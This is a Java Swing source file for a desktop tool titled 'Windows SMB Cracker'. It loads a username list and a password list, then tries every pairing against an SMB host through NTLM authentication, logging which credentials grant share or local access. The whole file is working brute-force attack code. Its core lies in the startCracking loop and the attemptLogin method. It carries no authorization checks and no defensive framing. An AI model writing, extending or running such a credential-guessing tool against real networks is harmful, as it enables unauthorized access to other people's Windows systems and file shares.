package io.mattw.smbcracker;

import com.formdev.flatlaf.FlatLaf;
import com.formdev.flatlaf.extras.components.FlatFormattedTextField;
import com.formdev.flatlaf.extras.components.FlatTable;
import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbAuthException;
import jcifs.smb.SmbException;
import jcifs.smb.SmbFile;
import lombok.extern.log4j.Log4j2;
import net.miginfocom.swing.MigLayout;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.Collections;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

@Log4j2
public class MainWindow extends JFrame {

    private final DefaultTableModel resultsModel;

    private ExecutorService executors;
    private boolean running;
    private File usersFile;
    private long usersCount;
    private File passwordsFile;
    private long passwordsCount;
    private JProgressBar progressBar;

    public MainWindow() throws Exception {
        log.trace("MainWindow()");

        var icon = ImageIO.read(Objects.requireNonNull(getClass().getResource("/icon.png")));

        setIconImage(icon);
        setTitle("Windows SMB Cracker");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new BorderLayout());
        setSize(500, 600);
        setResizable(false);

        var centerX = (Toolkit.getDefaultToolkit().getScreenSize().width - getWidth()) / 2;
        var centerY = (Toolkit.getDefaultToolkit().getScreenSize().height - getHeight()) / 2;
        setLocation(centerX, centerY);

        FlatLaf.setGlobalExtraDefaults(Collections.singletonMap("@accentColor", "#0094FF"));

        var topPanel = new JPanel(new MigLayout("fillx, nogrid"));
        add(topPanel, BorderLayout.NORTH);

        var lblAddress = new JLabel("Address");
        lblAddress.putClientProperty("FlatLaf.style", "font: bold");
        var address = new FlatFormattedTextField();
        address.setText("192.168.0.202");
        address.setPlaceholderText("192.168.0.202");
        address.setColumns(9999);
        var lblAt = new JLabel("@");
        var domain = new FlatFormattedTextField();
        domain.setPlaceholderText("domain (optional)");
        domain.setColumns(9999);

        topPanel.add(lblAddress, "width 80!");
        topPanel.add(address, "");
        topPanel.add(lblAt, "");
        topPanel.add(domain, "wrap");

        var userFileChooser = new JFileChooser();
        userFileChooser.setCurrentDirectory(new File("."));
        userFileChooser.setFileFilter(new FileNameExtensionFilter("Text Files", "txt", "text"));
        var lblUsernames = new JLabel("Usernames");
        var usersBtn = new JButton("Browse");
        var userFileName = new JLabel("file.txt");
        var lblUsersCount = new JLabel("0");

        usersBtn.addActionListener(e -> {
            int status = userFileChooser.showOpenDialog(this);
            if (status == JFileChooser.APPROVE_OPTION) {
                usersFile = userFileChooser.getSelectedFile();

                SwingUtilities.invokeLater(() -> {
                    userFileName.setText(usersFile.getName());
                    lblUsersCount.setText(String.valueOf(usersCount = getLineCount(usersFile)));
                });
            }
        });

        topPanel.add(lblUsernames, "width 80!");
        topPanel.add(usersBtn, "width 80!");
        topPanel.add(userFileName, "");
        topPanel.add(lblUsersCount, "wrap");

        var passwordFileChooser = new JFileChooser();
        passwordFileChooser.setCurrentDirectory(new File("."));
        passwordFileChooser.setFileFilter(new FileNameExtensionFilter("Text Files", "txt", "text"));
        var lblPasswords = new JLabel("Passwords");
        var passwordsBtn = new JButton("Browse");
        var passwordsFileName = new JLabel("file.txt");
        var lblPasswordsCount = new JLabel("0");

        passwordsBtn.addActionListener(e -> {
            int status = passwordFileChooser.showOpenDialog(this);
            if (status == JFileChooser.APPROVE_OPTION) {
                passwordsFile = passwordFileChooser.getSelectedFile();

                SwingUtilities.invokeLater(() -> {
                    passwordsFileName.setText(passwordsFile.getName());
                    lblPasswordsCount.setText(String.valueOf(passwordsCount = getLineCount(passwordsFile)));
                });
            }
        });

        topPanel.add(lblPasswords, "width 80!");
        topPanel.add(passwordsBtn, "width 80!");
        topPanel.add(passwordsFileName, "");
        topPanel.add(lblPasswordsCount, "wrap");

        progressBar = new JProgressBar();
        progressBar.setStringPainted(true);
        progressBar.setString("Idle");
        var startBtn = new JButton("Start");

        topPanel.add(progressBar, "grow");
        topPanel.add(startBtn, "width 100!, wrap");

        var columns = new String[]{"Login", "Path", "Status"};

        var resultsTable = new FlatTable();
        resultsTable.setCellSelectionEnabled(true);
        resultsModel = new DefaultTableModel(new String[][]{}, columns);
        resultsTable.setModel(resultsModel);
        var scrollPane = new JScrollPane(resultsTable);

        add(scrollPane, BorderLayout.CENTER);

        var bottomPanel = new JPanel(new MigLayout("fillx, nogrid"));
        add(bottomPanel, BorderLayout.SOUTH);

        var lblTps = new JLabel("0 tries/second");
        var saveResults = new JButton("Save Results");

        bottomPanel.add(lblTps, "grow");
        bottomPanel.add(saveResults, "width 100!, wrap");

        startBtn.addActionListener(e -> new Thread(() -> {
            if (running) {
                SwingUtilities.invokeLater(() -> {
                    startBtn.setEnabled(false);
                    startBtn.setText("Stopping");
                    progressBar.setForeground(new Color(179, 98, 0));
                });

                try {
                    executors.shutdown();
                    executors.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
                } catch (InterruptedException ignored) {
                }

                running = false;

                SwingUtilities.invokeLater(() -> {
                    startBtn.setEnabled(true);
                    startBtn.setText("Start");
                    progressBar.setValue(100);
                    progressBar.setIndeterminate(false);
                });
            } else {
                SwingUtilities.invokeLater(() -> {
                    startBtn.setText("Stop");
                    progressBar.setValue(0);
                    progressBar.setString("0.00%");
                    progressBar.setIndeterminate(true);
                    progressBar.setForeground(new Color(0, 122, 255));
                });

                running = true;

                startCracking(address.getText(), domain.getText());
            }
        }).start());
    }

    public long getLineCount(File file) {
        long count = 0;
        try (var fr = new FileReader(file);
             var br = new BufferedReader(fr)) {
            while (br.readLine() != null) {
                count++;
            }
        } catch (Exception ignored) {
        }
        return count;
    }

    public void startCracking(String address, String domain) {
        log.debug("startCracking(address={}, domain={})", address, domain);

        executors = Executors.newFixedThreadPool(2);
        executors.execute(() -> {
            long tries = 0;

            try (var fr = new FileReader(usersFile);
                 var userReader = new BufferedReader(fr)) {
                String username;
                while ((username = userReader.readLine()) != null) {
                    String password;
                    try (var fr2 = new FileReader(passwordsFile);
                         var passReader = new BufferedReader(fr2)) {
                        while ((password = passReader.readLine()) != null) {
                            log.debug("{} {} {} {}", address, domain, username, password);

                            try {
                                Thread.sleep(500);

                                String status = attemptLogin(address, domain, username, password);

                                log.debug(status);

                                if (!"failed".equals(status)) {
                                    resultsModel.addRow(new String[]{username + ":" + password, "", status});
                                }
                            } catch (Exception e) {
                                log.warn("Login attempt failure", e);
                            }

                            tries++;

                            double percentage = (double) tries / (usersCount * passwordsCount) * 100.0;
                            log.debug("{} {}", tries, percentage);
                            SwingUtilities.invokeLater(() -> {
                                progressBar.setString(String.format("%.2f%%", percentage));
                                progressBar.setValue((int) percentage);
                            });

                            if (!running) {
                                break;
                            }
                        }
                    } catch (Exception e) {
                        log.warn("Problem reading passwords file", e);
                    }
                    if (!running) {
                        break;
                    }
                }
            } catch (Exception e) {
                log.warn("Problem reading usernames file", e);
            }

            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }

            log.debug("Done");
        });
    }

    public String attemptLogin(String host, String domain, String user, String pass) throws SmbException {
        try {
            var ntlmAuth = new NtlmPasswordAuthentication(domain, user, pass);
            var domains = new SmbFile("smb://" + host + "/", ntlmAuth).listFiles();
            for (int a = 0; a < domains.length; ++a) {
                log.debug(domains[a].getPath());
                var file = new File(domains[a].getPath().replace("smb://", "\\"));
                if (file.exists()) {
                    return "local-access";
                }

                try {
                    domains[a].listFiles();
                    return "smb-access";
                } catch (SmbAuthException ignored) {
                    return "restricted-access";
                } catch (Exception ignored) {
                }
            }
            return "login-no-files";
        } catch (SmbException e) {
            throw e;
        } catch (Exception e) {
            log.warn(e);
        }
        return "failed";
    }

}
